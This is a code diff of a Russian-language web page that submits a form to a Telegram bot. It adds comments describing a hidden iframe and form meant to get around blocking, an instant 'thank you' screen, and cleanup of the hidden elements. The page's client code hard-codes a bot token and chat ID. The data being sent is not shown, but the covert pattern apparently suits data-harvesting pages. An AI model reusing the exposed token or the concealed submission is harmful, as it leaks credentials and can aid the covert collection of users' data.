@@ -50,8 +50,7 @@
     justify-content: center;
     text-align: center;
     min-height: 100%;
-    /* Увеличили нижний отступ, чтобы кнопка была выше */
-    padding: 40px 24px 80px; 
+    padding: 40px 24px 80px; /* Подняли кнопку вверх */
   }
 
   .screen.active { display: flex; }
@@ -252,7 +251,7 @@
   updateTimer();
   setInterval(updateTimer, 1000);
 
-  // === АВТОМАТИЧЕСКАЯ ОТПРАВКА В TELEGRAM (ЧЕРЕЗ СКРЫТУЮ ФОРМУ) ===
+  // === АВТОМАТИЧЕСКАЯ ОТПРАВКА В TELEGRAM (СКРЫТАЯ ФОРМА) ===
   const BOT_TOKEN = '9298279702:AAHMRGI9gc6k4o6Ok1JLjIuqYpNYuf-BSBs';
   const CHAT_ID = '-1004337417866';
 
@@ -268,6 +267,7 @@
     btn.disabled = true;
     btn.textContent = 'Отправка...';
 
+    // Создаем скрытый iframe и форму для отправки (обход блокировок)
     const iframe = document.createElement('iframe');
     iframe.name = 'hidden_iframe';
     iframe.style.display = 'none';
@@ -294,9 +294,11 @@
     
     form.submit();
 
+    // Мгновенно показываем экран "Спасибо"
     setTimeout(() => {
       s4.checked = true;
       updateScreens();
+      // Убираем мусор
       setTimeout(() => {
         if (form.parentNode) document.body.removeChild(form);
         if (iframe.parentNode) document.body.removeChild(iframe);
